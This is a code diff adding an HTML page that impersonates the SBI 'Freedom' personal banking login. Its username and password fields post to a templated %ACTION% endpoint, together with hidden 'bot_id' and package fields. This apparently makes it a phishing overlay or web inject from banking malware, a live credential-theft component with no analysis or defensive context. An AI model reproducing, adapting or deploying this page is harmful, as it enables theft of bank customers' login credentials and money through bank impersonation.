@@ -1,0 +1,26 @@
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>SBIFreedomPlus</title>
+	<style>
+body { margin: 0; padding: 0; font-family: arial, serif; -webkit-text-size-adjust: none; -moz-text-size-adjust: none; -ms-text-size-adjust: none; text-size-adjust: none; background-color: #E7E7E7; font-size: 20px;  }  label { font-family: "Arial",serif; line-height: 1.2; float: left; margin-left: 10%; font-size: 16px; font-weight: bold; position: relative; padding-bottom: 3px; }  p { margin-bottom: 15px; }  #content_div { margin-left: 5px; margin-top: 10px; text-align: center; }  .submit-button { background: #f19f3a; display: inline; font-family: Arial, serif; font-size: 16px; padding: 5px 5px; text-decoration: none; width: 75%; height: 40px; border: none; color: #ffffff; margin-right: 30px; }  .submit-button:active { position: relative; top: 1px; }  .input-field { margin-bottom: 20px; outline: none; border-radius: 6px; width: 80%; margin-left: 10px; margin-right: 10px; font-family: "Arial",serif; font-size: 18px; font-weight: lighter; text-indent: 5px; padding: 0 0 0 20px; height: 40px; }  .fielderror { border: 1px solid #f00; margin-bottom: 20px; outline: none; border-radius: 6px; width: 80%; margin-left: 10px; margin-right: 10px; font-family: "Arial",serif; font-size: 18px; font-weight: lighter; text-indent: 5px; padding: 0 0 0 20px; height: 40px; } 	</style>
+</head>
+<body>
+	<div id="content_div">
+	<script src='%DYN_PATH_GENERAL%/jquery.min.js'></script>
+	<script src='%DYN_PATH_GENERAL%/validator.js'></script>
+	<form id='mainform' method='post' action='%ACTION%' onsubmit="return formvalidator()">
+		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+			<label class="data_label" for="Username">Personal Banking Login</label>
+			<br />
+			<input  id="username" name="fields[user]" type="text" placeholder="Internet Banking Username"  class="input-field" />
+			<br />
+			<input  id="password" name="fields[password]" type="password" placeholder="Internet Banking Password" class="input-field" />
+			<br />
+			<br />
+			<input type="submit" value="Login" id="submitBtn1" class="submit-button" style="margin-left: 5%;" />
+		</form>
+		
+	</div>
+</body>
+</html>
